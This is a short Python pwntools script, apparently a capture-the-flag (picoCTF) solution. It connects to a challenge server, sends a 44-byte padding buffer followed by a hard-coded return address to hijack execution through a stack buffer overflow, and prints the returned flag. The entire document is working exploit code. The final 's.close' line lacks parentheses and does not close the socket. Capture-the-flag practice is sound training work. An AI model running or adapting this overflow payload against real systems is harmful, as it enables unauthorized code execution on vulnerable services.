#!/usr/bin/env python

from pwn import *

host,port = 'saturn.picoctf.net', 56565

prefix = ""
offset = 44
overflow = "A" * offset
retn = ""
padding = ""
payload= "\xf6\x91\x04\x08"
postfix = "" 

buffer = bytes(prefix + overflow + retn + padding + payload + postfix,"latin-1")

try:
  s = remote(host, port)
  print(s.recvuntil(b'string:'))
  print("Sending evil buffer...")
  print("Buffer: " + str(buffer))
  s.sendline(buffer)
  s.recv()
  s.recv()
  flag = s.recv().decode('utf-8')
  print("Flag: " + flag)
  print("Done!")
except:
  print("Could not connect.")

s.close
